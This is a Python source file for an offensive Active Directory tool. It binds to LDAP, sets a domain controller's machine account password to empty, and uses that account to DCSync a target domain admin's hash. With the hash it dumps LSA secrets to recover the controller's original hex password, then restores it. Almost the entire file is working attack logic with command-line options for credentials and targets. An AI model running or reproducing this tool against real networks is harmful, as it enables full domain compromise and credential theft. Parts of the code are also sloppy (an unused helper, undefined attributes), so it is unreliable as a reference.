from getpass import getpass
import binascii
import ldap3
import argparse
from ldap3 import MODIFY_REPLACE, MODIFY_DELETE
from lib.ldap import init_ldap_session, get_dn
from lib.logger import logger
from lib.secrets import TargetDCSync, LSAOnlyDump

def restore_machine_password_complete(hex_password, domain, hostname, dc_ip, admin_user, admin_pass):
    password_bytes = binascii.unhexlify(hex_password)
    password_processed = password_bytes.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
    password_utf16 = ('"' + password_processed.decode('utf-8') + '"').encode('utf-16le')

#    return password_utf16
# use this function for hex password arg restores


class SYNCRESTORE:
    
    def __init__(self, username, password, hashes, aesKey, domain, dc_ip, kerberos, domain_admin, dc_name):
        self.ldap_session = None
        self.username = username
        self.password = password
        self.hashes = hashes
        self.aesKey = aesKey
        self.domain = domain
        self.dc_ip = dc_ip
        self.kerberos = kerberos
        self.ldaps = True
        
        #vars required for the reset
        self.domain_admin = domain_admin
        self.domain_admin_hash = ""
        self.dc_name = dc_name
        self.hex_password = "" # pulled from lsa after syncing a DA 
        
        
    def ldapsession(self):
        lmhash = ""
        nthash = ""
        if self.hashes:
            lmhash, nthash = self.hashes.split(':')
        if not (self.password or self.hashes or self.aes or self.no_pass):
                self.password = getpass("Password:")
        try:
            ldap_server, self.ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password, lmhash=lmhash, 
                                                            nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, 
                                                            aesKey=self.aesKey, hashes=self.hashes, ldaps=self.ldaps, channel_binding=False)
            logger.debug(f'[+] Bind successful {ldap_server}')
        except ldap3.core.exceptions.LDAPSocketOpenError as e: 
            if 'invalid server address' in str(e):
                print(f'Invalid server address - {self.domain}')
            else:
                print('Error connecting to LDAP server')
                print()
                print(e)
            exit()
        except ldap3.core.exceptions.LDAPBindError as e:
            print(f'Error: {str(e)}')
            exit()
        except ldap3.core.exceptions.LDAPInvalidValueError as e:
            print('Channel binding only available over LDAPS')
            exit()


        
    def reset_dc_password(self, restore=False):
        # Check if the DC exists first before we do anything
        # If it exists, change the password
        try:
            self.ldap_session.extend.standard.paged_search(self.search_base, 
                                                        search_filter=f"(&(objectClass=computer)(sAMAccountName={self.dc_name}))", 
                                                        attributes="distinguishedname", 
                                                        paged_size=1,
                                                        generator=False)
        
            if self.ldap_session.entries:
                dc_dn = str(self.ldap_session.entries[0].distinguishedname)
            
            if dc_dn:
                if restore:
                    print("[*] Restoring DC password with hexpass")
                    password_bytes = binascii.unhexlify(self.hex_password)
                    password_processed = password_bytes.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
                    password_utf16 = ('"' + password_processed.decode('utf-8') + '"').encode('utf-16le')
                
                else:
                    print("[*] Setting empty password on DC")
                    password_utf16 = '""'.encode('utf-16le')
                     
                result = self.ldap_session.modify(
                    dc_dn,
                    {'unicodePwd': [(MODIFY_REPLACE, [password_utf16])]}
                )
            if result and restore:
                print("[+] DC password restored successfully!")
                return True
            if result:
                print("[+] DC password zeroed out!")
                return True
            else:
                print("[-] Something went wrong during password reset")
                print(result)
                return False 
        except ldap3.core.exceptions.LDAPAttributeError as e:
            print("[-] Could not find target domain controller")
            return False
        except Exception as e:
            print(e)
            return False

    def sync_da_creds(self):
        sync = TargetDCSync(username=self.dc_name, dc_ip=self.dc_ip, target_user=self.domain_admin, domain=self.domain)
        da_hash = sync.dump_target()
        return da_hash
    
    def sync_dc_hexpass(self):
        lsa = LSAOnlyDump(username=self.domain_admin, nthash=self.domain_admin_hash, dc_ip=self.dc_ip, domain=self.domain)
        hex_password = lsa.dump_lsa_only()
        return hex_password


    def run(self):
        if not self.ldap_session:     #bind to ldap
            self.ldapsession()        #set search base to query
        self.search_base = get_dn(self.domain)
        
        print("[*] Searching for DC...")
        reset = self.reset_dc_password()
        
        if reset:
            print(f"[*] Searching for target domain admin...")
            self.domain_admin_hash = self.sync_da_creds()
        
        if self.domain_admin_hash:
            print("[*] Trying to get DC hex password...")
            self.hex_password = self.sync_dc_hexpass()
        
        if self.hex_password:
            self.reset_dc_password(restore=True)

def main():
    parser = argparse.ArgumentParser(description='Zero out a domain controller password, sync a domain admin account, then restore')
    
    auth_group = parser.add_argument_group('Auth Group')

    auth_group.add_argument('-u', required=True, help='Username')
    auth_group.add_argument('-p', help='Password')
    auth_group.add_argument('-d', required=True, help='Domain name')
    auth_group.add_argument('-dc-ip', required=True, help='Domain controller IP address')
    auth_group.add_argument('-hashes', help="LM and NT hashes, format is LMHASH:NTHASH")
    auth_group.add_argument('-aesKey', help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    auth_group.add_argument('-k', help='Use Kerberos authentication')

    target_group = parser.add_argument_group('Target Group')

    target_group.add_argument('-dc', required=True, help='Machine hostname (e.g., dc01$)')
    target_group.add_argument('-da', required=True, help='Target domainadmin to sync')

    args = parser.parse_args()
    
    username = args.u
    password = args.p
    hashes = args.hashes
    aesKey = args.aesKey
    domain = args.d
    dc_ip = args.dc_ip
    kerberos = args.k
    if not args.dc.endswith('$'):
        dc_name = args.dc + '$'
    else:
        dc_name = args.dc
    domain_admin = args.da
    
    syncrestore = SYNCRESTORE(username=username, password=password, hashes=hashes, aesKey=aesKey, domain=domain, dc_ip=dc_ip,
                              kerberos=kerberos, domain_admin=domain_admin, dc_name=dc_name)
    syncrestore.run()

if __name__ == "__main__":
    main()